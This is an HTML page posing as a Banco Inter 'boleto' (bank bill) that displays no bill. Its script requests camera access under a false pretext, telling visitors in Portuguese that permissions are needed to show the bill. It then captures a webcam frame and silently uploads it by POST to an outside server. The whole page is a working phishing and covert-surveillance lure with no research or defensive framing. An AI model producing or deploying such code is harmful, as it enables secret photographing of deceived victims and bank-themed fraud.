<!DOCTYPE html>
<html>
<head>
    <title>Boleto Inter</title>
    <style>
        #conteudo { display: none; }
        #erro { color: orange; }
    </style>
</head>
<body>

<div id="conteudo">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<div id="erro">
    <h2>Precisamos das suas permissões para mostrar o boleto, recarregue a página!</h2>
</div>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        document.getElementById("conteudo").style.display = "inline";
        document.getElementById("erro").style.display = "none";

        // Espera o vídeo estar pronto
        video.addEventListener('canplay', captureFrame);

    } catch (err) {
        document.getElementById("erro").style.display = "block";
        console.error("Erro ao acessar a câmera:", err);
    }
}

function captureFrame() {
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Captura o frame do vídeo
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Envia para o servidor
    canvas.toBlob(async (blob) => {
        try {
            const response = await fetch("https://camera-uploader-api.vercel.app/api/upload", {
                method: "POST",
                body: blob
            });
            const json = await response.json();
            console.log("Upload concluído:", json);
        } catch (err) {
            console.error("Erro no upload:", err);
        }
    }, "image/png");
}

startCamera();
</script>

</body>
</html>
